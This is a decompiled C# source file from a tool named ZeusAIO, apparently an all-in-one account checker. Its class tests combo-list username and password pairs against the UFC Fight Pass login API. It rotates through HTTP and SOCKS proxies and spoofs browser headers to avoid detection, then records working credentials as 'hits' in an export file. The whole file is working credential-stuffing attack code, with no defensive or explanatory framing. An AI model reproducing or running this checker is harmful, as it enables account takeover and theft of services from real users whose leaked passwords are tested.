﻿// Decompiled with JetBrains decompiler
// Type: UfcTV.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace UfcTV
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("Connection", "keep-alive");
              httpRequest.AddHeader("Origin", "https://ufcfightpass.com");
              httpRequest.AddHeader("Realm", "dce.ufc");
              httpRequest.AddHeader("Accept-Language", "en-US");
              httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
              httpRequest.AddHeader("x-app-var", "4.20.6");
              httpRequest.AddHeader("DNT", "1");
              httpRequest.AddHeader("x-api-key", "857a1e5d-e35e-4fdf-805b-a87b6f8364bf");
              httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
              httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
              httpRequest.AddHeader("Referer", "https://dce-frontoffice.imggaming.com/");
              httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
              string str1 = "{\"id\":\"" + s[0] + "\",\"secret\":\"" + s[1] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://dce-frontoffice.imggaming.com/api/v2/login", str1, "application/json").ToString();
              if (!str2.Contains("loginnotfound") && !str2.Contains("NOT_FOUND"))
              {
                if (str2.Contains("instruct") || str2.Contains("authorisationToken"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - UFC] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/UfcTv_hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
